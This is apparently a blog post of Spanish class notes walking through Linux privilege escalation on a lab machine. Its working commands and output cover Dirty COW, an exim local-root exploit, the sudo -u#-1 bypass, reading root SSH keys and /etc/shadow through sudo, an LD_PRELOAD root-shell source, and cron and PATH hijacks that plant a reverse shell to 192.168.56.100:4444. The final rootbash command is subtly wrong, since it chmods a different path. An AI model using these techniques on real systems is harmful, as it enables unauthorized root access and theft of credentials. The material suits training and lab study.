---
title: "[ES] Escalada de privilegios en Linux"
date: 2025-03-21T00:00:00+00:00
tags: ["hacking","spanish","cybersec","classnotes"]
author: "XoanOuteiro"
showToc: true
TocOpen: false
draft: false
description: "Guia de escalada de privilegios en Linux"
---

Ejemplos realizados en la máquina LPEP

## Escalada por exploits del Kernel

Un ejemplo básico es usar exploits de kernel. Por ejemplo en este caso dirtycow (un fallo en el kernel que permite a un usuario no privilegiado modificar ficheros a los que solo podria acceder en modo lectura)

Ejemplo:

En este caso tenemos dirtycow en /tools:

Podemos compilarlo y ejecutarlo.

``` bash
gcc -pthread c0w.c -o c0 
./c0
```

Tras un cierto tiempo recuperaremos la terminal.

Una señal de funcionamiento del exploit es el fichero .bak en tmp:

``` bash
user@debian:~/tools/dirtycow$ ls -lhF /tmp/
total 1.8M
-rw-r--r-- 1 root root 1.7M Mar 18 16:02 backup.tar.gz
-rwxr-xr-x 1 user user  43K Mar 18 15:59 bak*
-rw-r--r-- 1 root root   29 Mar 18 16:02 useless
-rw-r--r-- 1 root root   29 Mar 18 16:02 useless2
user@debian:~/tools/dirtycow$ 
```

Lo que hemos hecho ha sido machacar passwd con otro archivo, y ahora en vez de servir para cambiar la contraseña instancia una shell como el usuario root:

``` bash
user@debian:~/tools/dirtycow$ /usr/bin/passwd
root@debian:/home/user/tools/dirtycow# id
uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
```

En el fichero .bak mencionado antes esta el binario passwd bueno.

Podemos revertir el binario a su estado original mediante:

``` bash
cp /tmp/bak /usr/bin/passwd
rm -rf /tmp/bak
```

Otro exploit por ejemplo es el de exim4 (el servidor SMTP del puerto 25) que se puede utilizar en la version 4.86.2 SI TIENE el bit SETUID root Y SI se instalo a traves de perl_startup.

Podemos comprobarlo:

``` bash
user@debian:~$ exim -bV
Exim version 4.84 #3 built 13-May-2017 01:45:35
Copyright (c) University of Cambridge, 1995 - 2014
(c) The Exim Maintainers and contributors in ACKNOWLEDGMENTS file, 2007 - 2014
Probably GDBM (native mode)
Support for: crypteq iconv() Perl DKIM PRDR OCSP
```

Vemos que es la version correcta y que tiene soporte para perl:

``` bash
user@debian:~$ head /etc/exim.conf
######################################################################
#                  Runtime configuration file for Exim               #
######################################################################

perl_startup = do '/usr/share/exim4/exigrey.pl'

# This is a default configuration file which will operate correctly in
# uncomplicated installations. Please see the manual for a complete list
# of all the runtime configuration options that can be included in a
# configuration file. There are many more than are mentioned here. The
```

Tiene el perl_startup activado.

``` bash
user@debian:~$ ls -lhaF /usr/sbin/exim-4.84-3 
-rwsr-xr-x 1 root root 942K May 13  2017 /usr/sbin/exim-4.84-3*
```

Y tiene el SUID activado, con lo cual deberia ser vulnerable.

``` bash
user@debian:~$ cd tools/exim/
user@debian:~/tools/exim$ ./cve-2016-1531.sh 
[ CVE-2016-1531 local root exploit
sh-4.1# whoami
root
```

Y somos root.

---
## Escalada por mala configuracion de sudoers

Otro ejemplo posible en esta máquina seria explotar el binario sudo.
Una cuenta Run as ALL es una cuenta configurada mediante /etc/sudoers tal que user ALL = (ALL,!root) NOPASSWD: ALL

Se lee como "Permito al usuario user ejecutar cualquier comando del sistema como cualquier usuario MENOS root".

Mediante:

``` bash
user@debian:~/tools/exim$ dpkg -l | grep -i sudo
ii  sudo                                1.7.4p4-2.squeeze.6          Provide limited super user privileges to specific users
```

Vemos que estamos en una version vulnerable.

Veamos:

``` bash
user@debian:~/tools/exim$ sudo -u root whoami
[sudo] password for user: 
Sorry, user user is not allowed to execute '/usr/bin/whoami' as root on debian.localdomain.
```

Funciona como se espera gracias al fichero sudoers, con www-data:

``` bash
user@debian:~/tools/exim$ sudo -u www-data whoami
www-data
```

Funciona correctamente. Utilizando UIDs en vez del nombre:

``` bash
user@debian:~/tools/exim$ sudo -u#0 whoami  
[sudo] password for user: 
Sorry, user user is not allowed to execute '/usr/bin/whoami' as root on debian.localdomain.

user@debian:~/tools/exim$ sudo -u#33 whoami 
www-data
```

Funciona tambien como se espera, pero mediante el UID -1:

``` bash
user@debian:~/tools/exim$ sudo -u#-1 whoami
root
```

Asi que ahora seria tan simple como:

``` bash
user@debian:~/tools/exim$ sudo -u#-1 bash  
root@debian:/home/user/tools/exim# 
```

---
## Escalada por errores de usuario

Otro ejemplo mucho mas simple de contraseñas filtradas seria ver el historial, en este caso con el comando history podemos ver:

``` bash
    4  mysql -h somehost.local -uroot -ppassword123
```

Que ademas, el historial se escribe en .bash_history en home/user cuando se cierra sesion. Esto puede ser especialmente problematico si la empresa tiene SIEM porque los tecnicos podran ver la contraseña.

---
## Escalada por lectura de ficheros arbitraria mediante sudoers

Otra opcion seria ver si exiten claves SSH expuestas para acceder al sistema, ademas, si se consigue, aunque el usuario cambie la contraseña seguimos teniendo persistencia ya que la clave privada no cambia.

Si por ejemplo podemos utilizar el comando arp como root podemos leer ficheros con:

``` bash
sudo arp -v -f "/root/.ssh/id_rsa"
```

Similarmente con apache2 podemos indicar que se use como fichero de configuracion un archivo arbitraro, lo cual escribira segmentos como errores de sintaxis:

``` bash
sudo apache2 -f /etc/shadow
```

---
## Escalada por escape a shell

En cuanto a escapes a shell, muchos programas lo permiten, como iftop. Mediante ! podemos escribir comandos, si utilizamos sudo iftop podremos instanciar bash como root.

Otro ejemplo mas seria el sudo shell scape. Como por ejemplo en vim, less, more ... O cualquier binario que tenga salidas a comandos, podemos ver muchos ejemplos en GTFOBins. Si por ejemplo podemos usar cat como sudo podriamos ver /etc/shadow, pero habria que crackear contraseñas, pero sin embargo podemos por ejemplo leer claves SSH de admins. (/home/\[user\]/.ssh/id_rsa o /root/.ssh/id_rsa)

---
## Escalada por Directory Listing the EvilNGINX

Podemos utilizar un fichero de cofiguracion de nginx malicioso que lo que era sera crear un servidor web en un puerto x y que utilizara como document root la raiz del disco duro, sirviendo asi todo el dispositivo. Utiliza autoindex on para que el sistema se vea como un directory listing.

``` bash
sudo nginx -c ~/tools/nginx/evil_nginx.conf
```

Y despues podriamos utilizar:

``` bash
curl https://[lPEPip]:[port]/root/.ssh/id_rsa > id_rsa
```


---
## Escalada por variables de entorno

LD_PRELOAD carga un objeto compartido antes que cualquier otro cuando se ejecuta un programa, sirve para ocultar codigo malicioso en procesos benignos.

En este caso:

``` bash
user@debian:~/tools/environment$ cat preload.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
  unsetenv("LD_PRELOAD");
  setresuid(0,0,0);
  system("/bin/bash -p");
}

user@debian:~/tools/environment$ gcc -fPIC shared -nostartfiles -o /tmp/preload.so preload.c
```

Y despues podemos utilizar

``` bash
sudo LD_PRELOAD=/tmp/preload.so find
```

Y seriamos root

---
## Escalada mediante tareas programadas (mediante escritura en crontab)

Podemos ver el crontab:

``` bash
user@debian:~/tools/environment$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh

```

Overwrite.sh se ejecuta como root. Los  5 asteriscos significa que se ejecutara cada minuto. Si localizamos y vemos los permisos de overwrite.sh:

``` bash
user@debian:~/tools/environment$ locate overwrite.sh
locate: warning: database `/var/cache/locate/locatedb' is more than 8 days old (actual age is 2866.3 days)
/usr/local/bin/overwrite.sh
user@debian:~/tools/environment$ ls -lhF /usr/local/bin/overwrite.sh
-rwxr--rw- 1 root staff 83 Mar 18 15:07 /usr/local/bin/overwrite.sh*
```

Vemos que podemos escribir sobre el, podemos insertar una reverse shell:

``` bash
user@debian:~/tools/environment$ cat /usr/local/bin/overwrite.sh
#!/bin/bash

echo `date` > /tmp/useless
sh -i >& /dev/tcp/192.168.56.100/4444 0>&1
```

Y ahora con un escuchador seriamos root.

---
## Path Hijacking con Cronjobs

Otra opcion, como se llama de manera relativa, podriamos emplear un path hijacking para que se ejecute un overwrite.sh controlado por nosotros.

La primera carpeta del PATH es /home/user, y podemos escribir en el.

Con una reverseshell:

``` bash
cd /home/user
echo "sh -i >& /dev/tcp/192.168.56.100/4444 0>&1" > overwrite.sh
```

Creando un rootbash:

``` bash
cd /home/user
echo "cp /bin/bash /tmp/rootbash; chmod +xs /bin/rootbash" > overwrite.sh
```
